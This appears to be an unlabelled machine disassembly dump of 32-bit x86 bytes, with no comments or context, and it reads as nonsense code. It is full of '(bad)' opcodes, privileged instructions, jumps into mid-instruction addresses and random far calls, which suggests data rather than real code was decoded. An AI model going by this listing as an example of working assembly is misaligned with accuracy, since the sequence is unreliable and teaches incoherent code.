  42bb31:	mov    DWORD PTR [ebp-0x8],eax
  42bb34:	jne    0x42bb7b
  42bb36:	jmp    0x42bac3
  42bb38:	mov    ebp,DWORD PTR [eax]
  42bb3a:	clc    
  42bb3b:	retf   0xff57
  42bb3e:	push   ecx
  42bb3f:	mov    DWORD PTR ds:0x757210,eax
  42bb45:	mov    ecx,DWORD PTR [ebp-0x4]
  42bb48:	sub    esp,DWORD PTR [ebx-0x77]
  42bb4b:	dec    DWORD PTR [eax*4-0x74ca8abb]
  42bb52:	or     ah,bh
  42bb54:	pop    es
  42bb55:	ds sahf 
  42bb57:	push   DWORD PTR [edx]
  42bb59:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  42bb5f:	(bad)  
  42bb60:	mov    bh,bh
  42bb62:	jmp    0x42bb50
  42bb64:	leave  
  42bb65:	jne    0x42bb6f
  42bb67:	call   0x2fb4c1
  42bb6c:	in     al,dx
  42bb6d:	dec    ebp
  42bb6e:	add    dh,BYTE PTR [ebx]
  42bb70:	add    BYTE PTR [ebx],al
  42bb72:	inc    ebp
  42bb73:	cmp    esi,DWORD PTR ds:0xc78b9c74
  42bb79:	or     al,0xf0
  42bb7b:	add    BYTE PTR [ebp+0x458bf845],al
  42bb81:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  42bb87:	adc    al,0x7
  42bb89:	enter  0x9fc0,0xa5
  42bb8d:	rol    BYTE PTR [eax],0x5e
  42bb90:	mov    ecx,ecx
  42bb92:	or     al,0xc
  42bb94:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  42bb9b:	jmp    0x42bb9c
  42bb9d:	push   ebp
  42bb9e:	mov    esp,ebp
  42bba0:	cld    
  42bba1:	inc    ebp
  42bba2:	inc    ebp
  42bba3:	or     DWORD PTR [ecx+0x457dec10],0x0
  42bbaa:	push   esi
  42bbab:	push   esi
  42bbac:	mov    edi,0x7af080f
  42bbb1:	add    bh,al
  42bbb3:	test   DWORD PTR [esi+0x3a7320f],ebx
  42bbb9:	add    BYTE PTR [ecx+0x4540100f],cl
  42bbbf:	mov    ebp,eax
  42bbc1:	mov    ebp,edi
  42bbc3:	lock call edx
  42bbc6:	fcom   DWORD PTR [ebp+0x45]
  42bbc9:	mov    eax,0x148a8b
  42bbce:	push   ecx
  42bbcf:	enter  0xc145,0x83
  42bbd3:	cmp    ecx,DWORD PTR [eax]
  42bbd5:	add    BYTE PTR [ebp+0x4d],al
  42bbd8:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  42bbde:	call   0xffa2b74d
  42bbe3:	cmp    eax,DWORD PTR [ebp-0xc]
  42bbe6:	jmp    DWORD PTR [eax+edx*1-0x4e]
  42bbea:	push   ebp
  42bbeb:	(bad)  
  42bbec:	call   0x33b9f0
  42bbf1:	mov    bh,0xdb
  42bbf3:	cld    
  42bbf4:	or     BYTE PTR [ebp+0x45],bl
  42bbf7:	(bad)  
  42bbf8:	call   0xff7cb888
  42bbfd:	add    al,BYTE PTR [ebp+0x37]
  42bc00:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  42bc06:	jne    0x42bc08
  42bc08:	(bad)  
  42bc09:	cmp    edi,esp
  42bc0b:	jne    0x42bc3e
  42bc0d:	mov    edi,edi
  42bc0f:	or     BYTE PTR [ebx-0x307f0b49],cl
  42bc15:	pop    ds
  42bc16:	into   
  42bc17:	je     0x42bbda
  42bc19:	mov    ebx,DWORD PTR [esi]
  42bc1b:	or     BYTE PTR [ebp-0x49],al
  42bc1e:	mov    esp,DWORD PTR [esi-0x77]
  42bc21:	mov    esi,0x8451f0c
  42bc26:	mov    eax,DWORD PTR [eax]
  42bc28:	or     al,0x66
  42bc2a:	sar    bl,0x3b
  42bc2d:	xor    esi,DWORD PTR [ebp+0x66]
  42bc30:	xor    ecx,edi
  42bc32:	pop    edi
  42bc33:	adc    bl,BYTE PTR [ebx+0x7c]
  42bc36:	ret    0xff
  42bc39:	cld    
  42bc3a:	inc    ebp
  42bc3b:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  42bc41:	cld    
  42bc42:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  42bc49:	push   0xffffff83
  42bc4b:	pop    edi
  42bc4c:	or     BYTE PTR [ebp+0x53],dh
  42bc4f:	xorps  xmm1,xmm2
  42bc52:	test   BYTE PTR [eax+eax*1],bh
  42bc55:	add    BYTE PTR [eax],al
  42bc57:	adc    eax,eax
  42bc59:	add    DWORD PTR [esp+edi*2-0xff7b00],0xffffffb7
  42bc61:	jmp    DWORD PTR [eax]
  42bc63:	ror    al,0x5e
  42bc66:	inc    ebp
  42bc67:	leave  
  42bc68:	xor    ecx,DWORD PTR [eax]
  42bc6a:	and    DWORD PTR [ebx-0x3ebd0708],ecx
  42bc70:	add    ah,al
  42bc72:	xor    edi,edi
  42bc74:	xor    DWORD PTR [ebx],0x66003308
  42bc7a:	mov    DWORD PTR [ebp-0xc],ecx
  42bc7d:	pcmpgtw mm0,mm0
  42bc80:	add    dl,ah
  42bc82:	leave  
  42bc83:	mov    edi,DWORD PTR [esi-0x7d]
  42bc86:	push   ax
  42bc88:	dec    ebp
  42bc89:	mov    esi,DWORD PTR [ebx-0x75]
  42bc8c:	lea    ebp,[eax-0x7c00ff08]
  42bc92:	xor    eax,DWORD PTR [eax]
  42bc94:	sysret 
  42bc96:	dec    ebp
  42bc97:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  42bc9e:	push   WORD PTR [ecx+0x8]
  42bca2:	jne    0x42bc65
  42bca4:	ud0    ecx,DWORD PTR [ecx]
  42bca7:	mov    edi,DWORD PTR [edx+0x660000ac]
  42bcad:	(bad)  
  42bcae:	iret   
  42bcaf:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  42bcb6:	cli    
  42bcb7:	inc    ebp
  42bcb8:	cmp    al,0x8d
  42bcba:	add    BYTE PTR [esi+0x2d],ah
  42bcbd:	inc    ebp
  42bcbe:	pop    ebp
  42bcbf:	lea    ecx,[edi]
  42bcc1:	mov    dl,bh
  42bcc3:	add    BYTE PTR [edi],cl
  42bcc5:	mov    DWORD PTR [eax+eax*8],edi
  42bcc8:	mov    ebx,0x3b87
  42bccd:	add    BYTE PTR [ebx],ch
  42bccf:	inc    ebp
  42bcd0:	data16 (bad) 
  42bcd2:	clc    
  42bcd3:	int3   
  42bcd4:	cmp    eax,DWORD PTR [eax]
  42bcd6:	je     0x42bc61
  42bcd8:	push   0xffffffc8
  42bcda:	pop    edi
  42bcdb:	xchg   DWORD PTR [ebp+0x0],eax
  42bcde:	data16 add BYTE PTR [ebp+0x45],cl
  42bce2:	lea    cx,[ebp+0x10]
  42bce6:	jb     0x42bce8
  42bce8:	jmp    0x42bc73
  42bcea:	call   eax
  42bcec:	clc    
  42bced:	xchg   DWORD PTR [edi+0x1],edi
  42bcf0:	mov    eax,DWORD PTR [eax]
  42bcf2:	or     BYTE PTR [ebp-0x49],al
  42bcf5:	lea    eax,[eax+0x74003154]
  42bcfb:	push   edi
  42bcfc:	inc    edx
  42bcfd:	jge    0x42bcfe
  42bcff:	mov    DWORD PTR [edi],ecx
  42bd01:	fdiv   DWORD PTR [edi-0x6]
  42bd04:	inc    DWORD PTR [eax]
  42bd06:	xor    edx,DWORD PTR [eax+0x5f]
  42bd09:	xchg   DWORD PTR [ebx+0x1],ebx
  42bd0c:	ret    0x0
  42bd0f:	xor    BYTE PTR [ebp-0x51],cl
  42bd12:	cmp    edi,0xf0ff89f8
  42bd18:	data16 ror al,0x84
  42bd1c:	rol    BYTE PTR [eax],0x3b
  42bd1f:	add    al,dh
  42bd21:	dec    eax
  42bd22:	xchg   esp,eax
  42bd23:	push   ebx
  42bd24:	jmp    0x42bcb1
  42bd26:	push   ebp
  42bd27:	add    esp,ebp
  42bd29:	add    ebp,esp
  42bd2b:	mov    edx,DWORD PTR [edi+0x24]
  42bd2e:	clc    
  42bd2f:	dec    esi
  42bd30:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  42bd36:	cmp    BYTE PTR [ebx],al
  42bd38:	jne    0x42bcc3
  42bd3a:	xor    esp,eax
  42bd3c:	jmp    0x45bebf
  42bd41:	add    ebp,DWORD PTR [ecx+ecx*4]
  42bd44:	jne    0x42bd3a
  42bd46:	call   0xffccbaa0
  42bd4b:	clc    
  42bd4c:	xchg   edi,eax
  42bd4d:	sti    
  42bd4e:	add    DWORD PTR [ebx],eax
  42bd50:	add    BYTE PTR [ebp+0x47],bl
  42bd53:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  42bd59:	pop    ebp
  42bd5a:	mov    DWORD PTR [esi-0x48],esi
  42bd5d:	jmp    0x42bda6
  42bd5f:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  42bd65:	(bad)  
  42bd67:	cmp    al,0x0
  42bd69:	cmp    eax,DWORD PTR [ebp+0x18]
  42bd6c:	lea    ebx,[ebp-0x56]
  42bd6f:	jle    0x42bd71
  42bd71:	jae    0x42bcfc
  42bd73:	mov    eax,esp
  42bd75:	call   0xb900:0x8b005587
  42bd7c:	inc    ebp
  42bd7d:	push   ebp
  42bd7e:	lea    ecx,[ebp-0x27ff4f12]
  42bd84:	mov    eax,edi
  42bd86:	int3   
  42bd87:	push   ebp
  42bd88:	xchg   edi,eax
  42bd8a:	add    esp,ebp
  42bd8c:	add    BYTE PTR [eax],al
  42bd8e:	inc    ebp
  42bd8f:	add    BYTE PTR [ebp+0x8b3255],cl
  42bd95:	cld    
  42bd96:	mov    DWORD PTR [edx],edi
  42bd98:	aam    0x75
  42bd9a:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  42bda0:	mov    DWORD PTR [ebx-0x50],edx
  42bda3:	test   BYTE PTR [ebp-0x1],0xe8
  42bda7:	mov    eax,DWORD PTR [eax]
  42bda9:	hlt    
  42bdaa:	add    al,al
  42bdac:	mov    eax,DWORD PTR ds:0x890045a8
  42bdb2:	dec    DWORD PTR [ebx+0x45fdf0e8]
  42bdb8:	inc    DWORD PTR [eax*2+0xf75854d]
  42bdbf:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  42bdc5:	call   0x72991b06
  42bdca:	je     0x42be2a
  42bdcc:	js     0x42be2d
  42bdce:	lock ret 0x7e
  42bdd2:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  42bdd8:	mov    edi,edi
  42bdda:	sbb    al,bl
  42bddc:	clc    
  42bddd:	add    BYTE PTR [ebp-0x73],bh
  42bde0:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  42bde6:	ror    BYTE PTR [eax],1
  42bde8:	dec    ebp
  42bde9:	xchg   ebp,eax
  42bdea:	mov    edi,edi
  42bdec:	in     al,0x8b
  42bdee:	jge    0x42bd79
  42bdf0:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  42bdf6:	clc    
  42bdf7:	pop    esi
  42bdf8:	fist   DWORD PTR [ebp+0x5d398b5d]
  42bdfe:	clc    
  42bdff:	add    al,0x6e
  42be01:	mov    eax,DWORD PTR [ebx]
  42be03:	mov    BYTE PTR [ebp+0x0],dl
  42be06:	mov    edx,DWORD PTR [ebx-0x20]
  42be09:	adc    esi,DWORD PTR [edi+0x5e005f42]
  42be0f:	add    eax,0x3b3b73
  42be14:	adc    al,0x89
  42be16:	pop    eax
  42be17:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  42be1b:	ret    0xf08
  42be1e:	cmp    al,0x2
  42be20:	mov    DWORD PTR [edx+0x665500fc],edi
  42be26:	add    eax,ebx
  42be28:	add    esp,eax
  42be2a:	sub    eax,eax
  42be2c:	or     BYTE PTR [ecx-0x77f474bb],cl
  42be32:	add    BYTE PTR [eax],al
  42be34:	mov    DWORD PTR [ebx-0x24],ebx
  42be37:	push   edi
  42be38:	push   ebp
  42be39:	clc    
  42be3a:	add    DWORD PTR [esi+0x1b0100],0x45
  42be41:	out    0xff,eax
  42be43:	add    edx,DWORD PTR [eax]
  42be45:	jmp    0x42be2f
  42be47:	cmp    ch,0x49
  42be4a:	(bad)  
  42be4b:	jmp    0x40c8469d
  42be50:	je     0x42bddc
  42be52:	mov    eax,DWORD PTR [eax-0x10c78304]
  42be58:	inc    ebp
  42be59:	add    BYTE PTR [ebx-0x770375],al
  42be5f:	add    ah,ch
  42be61:	add    edx,esp
  42be63:	pop    edi
  42be64:	pop    ebp
  42be65:	push   ebp
  42be66:	inc    ebx
  42be67:	in     al,dx
  42be68:	pop    ebp
  42be69:	in     al,dx
  42be6a:	cmp    edx,DWORD PTR [edi-0x8]
  42be6d:	xor    eax,0x895b9c94
  42be72:	leave  
  42be73:	call   0x8998057c
  42be78:	in     al,dx
  42be79:	in     al,0x45
  42be7b:	dec    ebp
  42be7c:	push   esi
  42be7d:	test   DWORD PTR [eax+0xfb010f],esi
  42be83:	add    BYTE PTR [eax+0xc018b],dh
  42be89:	leave  
  42be8a:	inc    ebp
  42be8b:	test   al,ch
  42be8d:	add    dh,bh
  42be8f:	add    bh,bh
  42be91:	dec    ebp
  42be92:	push   cs
  42be93:	mov    DWORD PTR [ecx],eax
  42be95:	hlt    
  42be96:	push   es
  42be97:	dec    ebp
  42be98:	leave  
  42be99:	mov    DWORD PTR [eax],ecx
  42be9b:	clc    
  42be9c:	cmovge eax,ecx
  42be9f:	mov    ecx,0x85c2f0
  42bea5:	clc    
  42bea6:	pop    DWORD PTR [ebp+0x1]
  42bea9:	push   ebx
  42beaa:	add    BYTE PTR [ebp-0x15],bh
  42bead:	push   esi
  42beae:	xor    eax,0x898a45
  42beb3:	cld    
  42beb4:	or     BYTE PTR [ebp+0x0],al
  42beb7:	xor    esp,DWORD PTR [esi-0x64]
  42beba:	add    DWORD PTR [esi+0x78308c1],edi
  42bec0:	add    ah,BYTE PTR [edx-0x49]
  42bec3:	int    0xbb
  42bec5:	mov    ecx,DWORD PTR [esi+0xc]
  42bec8:	add    dh,al
  42beca:	cmp    ecx,ebx
  42becc:	jne    0x42be96
  42bece:	xor    ecx,DWORD PTR [ebp+0x66]
  42bed1:	jmp    0xc9bed7
  42bed6:	add    DWORD PTR [ebp+0x0],eax
  42bed9:	mov    eax,ebx
  42bedb:	or     al,0x8b
  42bedd:	(bad)  
  42bede:	mov    ecx,esi
  42bee0:	mov    BYTE PTR [eax+eax*1+0x664c13c],cl
  42bee7:	mov    eax,edi
  42bee9:	or     BYTE PTR [edx],cl
  42beeb:	shl    cl,cl
  42beed:	icebp  
  42beee:	add    BYTE PTR [ebp+0x35],0x8b
  42bef2:	or     BYTE PTR [edx+eax*2],cl
  42bef5:	(bad)  
  42bef6:	or     cl,dh
  42bef8:	stc    
  42bef9:	shl    DWORD PTR [ebp-0x30],0xc6
  42befd:	xor    al,0x0
  42beff:	inc    ebp
  42bf00:	xchg   BYTE PTR [ebx],al
  42bf02:	add    esp,edi
  42bf04:	add    BYTE PTR [ebp-0x39],cl
  42bf07:	mov    al,bl
  42bf09:	test   DWORD PTR [ebx+0x1c348375],ecx
  42bf0f:	sub    al,0xbf
  42bf11:	jmp    0x42be98
  42bf13:	mov    edi,eax
  42bf15:	lock jge 0x42bf09
  42bf18:	lea    esi,[edx-0x74bad501]
  42bf1e:	mov    ebp,esp
  42bf20:	or     cl,dh
  42bf22:	leave  
  42bf23:	add    al,BYTE PTR [eax+eax*4-0x37ff9e00]
  42bf2a:	dec    ebp
  42bf2b:	dec    ebp
  42bf2c:	test   DWORD PTR [ebx],eax
  42bf2e:	paddb  mm6,mm0
  42bf31:	add    DWORD PTR [eax],eax
  42bf33:	dec    ebp
  42bf34:	mov    ecx,DWORD PTR [ebx-0x61b217f0]
  42bf3a:	mov    esi,DWORD PTR [edx]
  42bf3c:	or     al,0x2b
  42bf3e:	dec    ebp
  42bf3f:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  42bf45:	mov    esp,esp
  42bf47:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  42bf4e:	mov    DWORD PTR [ebx],ebp
  42bf50:	call   0xc764880
  42bf55:	mov    DWORD PTR [ebp+0x10],ecx
  42bf58:	(bad)  
  42bf59:	push   0x8b85ff10
  42bf5e:	clc    
  42bf5f:	or     al,0x57
  42bf61:	(bad)  
  42bf62:	push   ecx
  42bf63:	retf   
  42bf64:	mov    ebx,0xff4d8dc8
  42bf69:	mov    DWORD PTR [ebp+0x8],eax
  42bf6c:	xor    eax,DWORD PTR [ebp-0x75]
  42bf6f:	cmp    ebp,DWORD PTR [ebx]
  42bf71:	lsl    ebx,WORD PTR [edi-0x8]
  42bf75:	call   DWORD PTR [ebx-0x741bff75]
  42bf7b:	(bad)  
  42bf7c:	or     al,0x5b
  42bf7e:	dec    ebp
  42bf7f:	or     BYTE PTR [ebx],dh
  42bf81:	inc    ebp
  42bf82:	xor    esi,DWORD PTR ds:0x708088d
  42bf88:	in     eax,0x9e
  42bf8a:	add    BYTE PTR [edx],dh
  42bf8c:	inc    ebp
  42bf8d:	pop    edi
  42bf8e:	xor    eax,edx
  42bf90:	test   DWORD PTR [eax],0x83108b8b
  42bf96:	dec    ebp
  42bf97:	adc    al,0x33
  42bf99:	inc    ebp
  42bf9a:	xor    esi,DWORD PTR ds:0xc73b9c2b
  42bfa0:	jne    0x42bf9e
  42bfa2:	mov    eax,DWORD PTR [ebp+0x345f808]
  42bfa8:	mov    eax,DWORD PTR [ebp-0xc]
  42bfab:	mov    DWORD PTR [eax],0x685c9f4
  42bfb1:	clc    
  42bfb2:	dec    ecx
  42bfb3:	push   edi
  42bfb4:	xor    eax,0x4dd51745
  42bfb9:	xlat   BYTE PTR ds:[ebx]
  42bfba:	or     BYTE PTR [ebx+0x4d62fc57],0xd1
  42bfc1:	mov    eax,0x780084d
  42bfc6:	push   edi
  42bfc7:	clc    
  42bfc8:	ret    0xe99e
  42bfcb:	xor    dl,dl
  42bfcd:	xor    ecx,DWORD PTR [ebx+0x4d030803]
  42bfd3:	js     0x8894bd2
  42bfd9:	dec    ebp
  42bfda:	push   ebp
  42bfdb:	mov    edi,DWORD PTR [eax+0xc872fc]
  42bfe1:	lock enter 0xceca,0xf2
  42bfe6:	retf   0x18ce
  42bfe9:	jne    0x42c038
  42bfeb:	mov    ecx,DWORD PTR [ebx-0x31eaf304]
  42bff1:	enter  0xf0d6,0xca
  42bff5:	retf   0xf2c8
  42bff8:	into   
  42bff9:	out    dx,al
  42bffa:	dec    ebp
  42bffb:	dec    ebp
  42bffc:	jmp    0xff46bf34
  42c001:	xor    eax,DWORD PTR [ebp-0x15]
  42c004:	xor    esi,DWORD PTR [ebx]
  42c006:	mov    esi,DWORD PTR [ebx]
  42c008:	sub    eax,DWORD PTR [ebx]
  42c00a:	add    eax,DWORD PTR [ebx]
  42c00c:	or     bl,dl
  42c00e:	dec    ebp
  42c00f:	mov    DWORD PTR [ebx-0x38b2ef08],ecx
  42c015:	xor    eax,DWORD PTR [ebp-0xf00073]
  42c01b:	jb     0x42c062
  42c01d:	add    BYTE PTR [ebx],dh
  42c01f:	dec    ebp
  42c020:	pop    esi
  42c021:	mov    ebp,ebx
  42c023:	cld    
  42c024:	mov    esi,eax
  42c026:	call   0x521117f3
  42c02b:	stc    
  42c02c:	add    eax,0x4572aa
  42c031:	pop    edi
  42c032:	leave  
  42c033:	add    ecx,DWORD PTR [eax*2-0x3c13a1ab]
  42c03a:	in     al,dx
  42c03b:	mov    eax,edi
  42c03d:	xor    eax,0xf8008520
  42c043:	mov    DWORD PTR [ebp-0x14],0xf89c8534
  42c04a:	mov    eax,DWORD PTR [ebp-0x77]
  42c04d:	xor    al,0xf8
  42c04f:	pushf  
  42c050:	inc    ebp
  42c051:	(bad)  
  42c052:	cmp    eax,0x56869ce8
  42c057:	clc    
  42c058:	mov    edi,0x8518e4ec
  42c05e:	jmp    0xf056:0x8b457df8
  42c065:	push   edi
  42c066:	push   edi
  42c067:	push   ecx
  42c068:	push   ecx
  42c069:	push   edi
  42c06a:	xor    eax,esi
  42c06c:	mov    edx,0x32729e
  42c071:	add    ecx,eax
  42c073:	mov    edx,edi
  42c075:	clc    
  42c076:	retf   0xaf45
  42c079:	cmp    eax,0xc78b9ceb
  42c07e:	clc    
  42c07f:	cld    
  42c080:	jne    0x42c09a
  42c082:	xor    ebp,edx
  42c084:	xor    eax,DWORD PTR [ebp+0x3]
  42c087:	or     BYTE PTR [ebx],al
  42c089:	add    BYTE PTR [ebp-0x7747475],al
  42c08f:	hlt    
  42c090:	dec    ebp
  42c091:	dec    ebp
  42c092:	je     0x42c0c7
  42c094:	xor    esi,DWORD PTR [ebx]
  42c096:	xor    eax,DWORD PTR [ebx]
  42c098:	add    eax,DWORD PTR [ebx]
  42c09a:	add    ecx,DWORD PTR [edi]
  42c09c:	rol    ecx,cl
  42c09e:	mov    esi,DWORD PTR [ecx]
  42c0a0:	in     al,dx
  42c0a1:	inc    ebp
  42c0a2:	enter  0xca2b,0x33
  42c0a6:	icebp  
  42c0a7:	mov    DWORD PTR [edx],ecx
  42c0a9:	clc    
  42c0aa:	lock pop ebp
  42c0ac:	enter  0xf2e8,0xfe
  42c0b0:	retf   0xeeff
  42c0b3:	inc    ebp
  42c0b4:	jne    0x42c041
  42c0b6:	mov    edi,eax
  42c0b8:	cld    
  42c0b9:	dec    ebp
  42c0ba:	enter  0xbc89,0x8d
  42c0be:	sahf   
  42c0bf:	sti    
  42c0c0:	xor    bh,bh
  42c0c2:	mov    eax,DWORD PTR [ebp-0xc]
  42c0c5:	mov    esi,DWORD PTR [ebp-0x4]
  42c0c8:	xor    eax,esi
  42c0ca:	xor    eax,DWORD PTR [ebx+ebp*1+0x76323b9e]
  42c0d1:	mov    DWORD PTR [ebx-0x76ba0704],ecx
  42c0d7:	mov    ecx,DWORD PTR [ebx-0x3631070c]
  42c0dd:	(bad)  
  42c0de:	push   ebp
  42c0df:	shr    esp,0x4d
  42c0e2:	in     al,dx
  42c0e3:	cmp    eax,DWORD PTR [esi+esi*2]
  42c0e6:	add    BYTE PTR [ebx-0x39ca1bbb],cl
  42c0ec:	pushf  
  42c0ed:	mov    edi,0x85c7f445
  42c0f3:	call   0xf88847f0
  42c0f8:	xor    eax,0x53619cdb
  42c0fd:	dec    ebp
  42c0fe:	inc    ebp
  42c0ff:	mov    esi,DWORD PTR [esi]
  42c101:	clc    
  42c102:	pushf  
  42c103:	into   
  42c104:	mov    ecx,edi
  42c106:	in     al,dx
  42c107:	call   0x8b4b06ca
  42c10c:	pop    es
  42c10d:	or     BYTE PTR [ebx],dh
  42c10f:	or     BYTE PTR [edi+0x8a724d],bh
  42c115:	or     eax,edi
  42c117:	push   ebp
  42c118:	inc    ebp
  42c119:	cmpxchg8b (bad)
  42c11a:	(bad)  
  42c11b:	leave  
  42c11c:	loopne 0x42c0e8
  42c11e:	test   DWORD PTR [ebp-0x8],ecx
  42c121:	mov    eax,DWORD PTR [ebp-0x18]
  42c124:	aad    0x55
  42c126:	xlat   BYTE PTR ds:[ebx]
  42c127:	xor    eax,edi
  42c129:	add    esi,eax
  42c12b:	and    eax,DWORD PTR [eax]
  42c12d:	mov    eax,DWORD PTR [eax]
  42c12f:	(bad)  
  42c130:	leave  
  42c131:	sti    
  42c132:	inc    ebp
  42c133:	dec    DWORD PTR [ebx-0x39cc13ab]
  42c139:	mov    esi,ecx
  42c13b:	clc    
  42c13c:	(bad)  
  42c13d:	dec    ebp
  42c13e:	iret   
  42c13f:	xor    ebp,DWORD PTR [edi-0x74f71473]
  42c145:	jb     0x42c143
  42c147:	add    bh,al
  42c149:	inc    ebp
  42c14a:	(bad)  
  42c14b:	mov    eax,DWORD PTR [ebp-0xc]
  42c14e:	(bad)  
  42c14f:	xabort 0x62
  42c152:	loopne 0x42c121
  42c154:	jmp    FWORD PTR [ebx]
  42c156:	mov    DWORD PTR [ebx],eax
  42c158:	clc    
  42c159:	lock inc ebp
  42c15b:	dec    ebp
  42c15c:	mov    ecx,DWORD PTR [ebx+0x4d84ecfc]
  42c162:	loopne 0x42c197
  42c164:	inc    DWORD PTR [ebx]
  42c166:	mov    edi,DWORD PTR [ebx]
  42c168:	hlt    
  42c169:	jne    0x42c1b8
  42c16b:	mov    esi,DWORD PTR [ebx]
  42c16d:	in     al,0x8d
  42c16f:	dec    ebp
  42c170:	or     BYTE PTR [ebx],dh
  42c172:	jb     0x42c177
  42c174:	add    BYTE PTR [edi+0x45],bl
  42c177:	xor    ecx,DWORD PTR [ebx+0x4dc2e85b]
  42c17d:	add    BYTE PTR [ebx],dh
  42c17f:	mov    esi,DWORD PTR [ebx]
  42c181:	mov    ebp,DWORD PTR [ebx]
  42c183:	sbb    BYTE PTR [ebx-0x377403b3],cl
  42c189:	nop
  42c18a:	mov    ecx,0x338b4500
  42c18f:	add    DWORD PTR [ebx],0x70
  42c192:	mov    DWORD PTR [esi-0x8],edx
  42c195:	jne    0x42c1dc
  42c197:	mov    esi,DWORD PTR [esi]
  42c199:	push   edi
  42c19a:	pushf  
  42c19b:	push   edi
  42c19c:	mov    edx,DWORD PTR [ecx-0x15]
  42c19f:	xor    ecx,DWORD PTR [ebx+0x4572e0bb]
  42c1a5:	add    BYTE PTR [ebx],dh
  42c1a7:	retf   
  42c1a8:	add    edx,ecx
  42c1aa:	ror    DWORD PTR [edi],cl
  42c1ac:	mov    DWORD PTR ds:0x7f452dfc,ebp
  42c1b2:	mov    ch,dl
  42c1b4:	mov    BYTE PTR [eax+0xb],dh
  42c1b7:	fimul  WORD PTR [ebp+0x0]
  42c1ba:	mov    ecx,DWORD PTR [ebx+0x55b608f8]
  42c1c0:	xor    esi,DWORD PTR [ebx]
  42c1c2:	mov    DWORD PTR [ebx],esi
  42c1c4:	or     BYTE PTR [ebx],al
  42c1c6:	dec    ebp
  42c1c7:	add    ecx,DWORD PTR [ebx-0x318af7c5]
  42c1cd:	or     edi,0x8c64ca9e
  42c1d3:	out    dx,eax
  42c1d4:	loopne 0x42c1eb
  42c1d6:	(bad)  
  42c1d7:	jmp    0x13ec667
  42c1dc:	retf   0x4d4d
  42c1df:	xor    ecx,DWORD PTR [ebx-0x31c40bfd]
  42c1e5:	je     0x3243608f
  42c1eb:	mov    ecx,DWORD PTR [ecx+0x45450818]
  42c1f1:	mov    DWORD PTR [ebx],esi
  42c1f3:	sbb    BYTE PTR [ecx-0x7472b3],bh
  42c1f9:	mov    eax,ecx
  42c1fb:	fmul   DWORD PTR [ebp+0x45]
  42c1fe:	mov    DWORD PTR ds:0xba459cf0,esi
  42c204:	mov    eax,DWORD PTR [ebp+0x55c6f8f0]
  42c20a:	(bad)  
  42c20b:	mov    ecx,eax
  42c20d:	sbb    BYTE PTR [ecx-0x7474babb],dl
  42c213:	sbb    al,bh
  42c215:	add    dh,0x1
  42c218:	mov    DWORD PTR [eax],0x4dc1005e
  42c21e:	leave  
  42c21f:	mov    eax,DWORD PTR [eax+ebx*1]
  42c222:	push   ebp
  42c223:	mov    esp,ebp
  42c225:	add    DWORD PTR [ebp+0x0],eax
  42c228:	mov    ecx,DWORD PTR [ecx]
  42c22a:	or     BYTE PTR [eax-0x80],cl
  42c22d:	mov    DWORD PTR [ecx],eax
  42c22f:	or     al,0x0
  42c231:	inc    ebp
  42c232:	add    BYTE PTR [ebx],dh
  42c234:	in     al,dx
  42c235:	add    edx,DWORD PTR [ebx-0x77]
  42c238:	mov    esi,esp
  42c23a:	adc    BYTE PTR [ebp+0x16],al
  42c23d:	xor    edi,DWORD PTR [edi+0x7890803]
  42c243:	adc    al,0xcf
  42c245:	inc    ebp
  42c246:	sahf   
  42c247:	mov    esi,DWORD PTR [edx]
  42c249:	push   eax
  42c24a:	add    ebp,eax
  42c24c:	cmp    ecx,DWORD PTR [ecx+0x4581d075]
  42c252:	sahf   
  42c253:	mov    esp,DWORD PTR [eax+edi*1+0x42]
  42c257:	dec    ebp
  42c258:	fwait
  42c259:	dec    eax
  42c25a:	jmp    0xcdc6a0
  42c25f:	or     al,0x4d
  42c261:	sbb    BYTE PTR [ebx-0x3074f3c0],cl
  42c267:	or     al,0xd7
  42c269:	dec    ecx
  42c26a:	retf   
  42c26b:	dec    eax
  42c26c:	rcl    eax,cl
  42c26e:	retf   0xfc8
  42c271:	inc    ebp
  42c272:	or     eax,0x7f382d8b
  42c277:	sar    esp,0x3
  42c27a:	lahf   
  42c27b:	inc    eax
  42c27c:	mov    ebp,0x8b180089
  42c281:	inc    ebp
  42c282:	or     BYTE PTR [ebx],dh
  42c284:	iret   
  42c285:	add    ecx,ebx
  42c287:	mov    ecx,eax
  42c289:	adc    al,0x84
  42c28b:	inc    ebp
  42c28c:	add    al,0x33
  42c28e:	add    BYTE PTR [ebx],al
  42c290:	dec    ebp
  42c291:	mov    DWORD PTR [ecx+0x4d45dc14],ecx
  42c297:	mov    ecx,DWORD PTR [ebx+0x6c714d4]
  42c29d:	ret    
  42c29e:	inc    ebp
  42c29f:	add    edi,eax
  42c2a1:	push   ebp
  42c2a2:	or     bh,al
  42c2a4:	test   DWORD PTR [eax+edi*8],edx
  42c2a7:	test   DWORD PTR [eax+edi*8],esi
  42c2aa:	pushf  
  42c2ab:	inc    ebp
  42c2ac:	mov    DWORD PTR [edx],esi
  42c2ae:	lock pushf 
  42c2b0:	inc    ebp
  42c2b1:	(bad)  
  42c2b2:	mov    DWORD PTR [eax+ebx*1],edx
  42c2b5:	test   DWORD PTR [ebp-0x8],eax
  42c2b8:	mov    eax,DWORD PTR [ebp-0x70]
  42c2bb:	mov    eax,DWORD PTR [eax]
  42c2bd:	sbb    BYTE PTR [ebx-0x2b3c7639],cl
  42c2c3:	scas   eax,DWORD PTR es:[edi]
  42c2c4:	dec    ebp
  42c2c5:	mov    ecx,DWORD PTR [ebx+0x559008]
  42c2cb:	xor    ecx,DWORD PTR [ebx+0x3c11038d]
